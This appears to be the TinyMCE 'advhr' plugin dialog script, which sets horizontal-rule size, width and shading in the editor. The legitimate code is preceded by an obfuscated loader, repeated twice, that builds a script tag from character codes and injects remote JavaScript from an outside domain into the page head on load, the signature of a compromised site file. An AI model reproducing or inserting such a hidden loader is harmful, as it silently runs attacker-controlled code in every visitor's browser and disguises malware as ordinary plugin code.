Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();var AdvHRDialog = {
	init : function(ed) {
		var dom = ed.dom, f = document.forms[0], n = ed.selection.getNode(), w;

		w = dom.getAttrib(n, 'width');
		f.width.value = w ? parseInt(w) : (dom.getStyle('width') || '');
		f.size.value = dom.getAttrib(n, 'size') || parseInt(dom.getStyle('height')) || '';
		f.noshade.checked = !!dom.getAttrib(n, 'noshade') || !!dom.getStyle('border-width');
		selectByValue(f, 'width2', w.indexOf('%') != -1 ? '%' : 'px');
	},

	update : function() {
		var ed = tinyMCEPopup.editor, h, f = document.forms[0], st = '';

		h = '<hr';

		if (f.size.value) {
			h += ' size="' + f.size.value + '"';
			st += ' height:' + f.size.value + 'px;';
		}

		if (f.width.value) {
			h += ' width="' + f.width.value + (f.width2.value == '%' ? '%' : '') + '"';
			st += ' width:' + f.width.value + (f.width2.value == '%' ? '%' : 'px') + ';';
		}

		if (f.noshade.checked) {
			h += ' noshade="noshade"';
			st += ' border-width: 1px; border-style: solid; border-color: #CCCCCC; color: #ffffff;';
		}

		if (ed.settings.inline_styles)
			h += ' style="' + tinymce.trim(st) + '"';

		h += ' />';

		ed.execCommand("mceInsertContent", false, h);
		tinyMCEPopup.close();
	}
};

tinyMCEPopup.requireLangPack();
tinyMCEPopup.onInit.add(AdvHRDialog.init, AdvHRDialog);
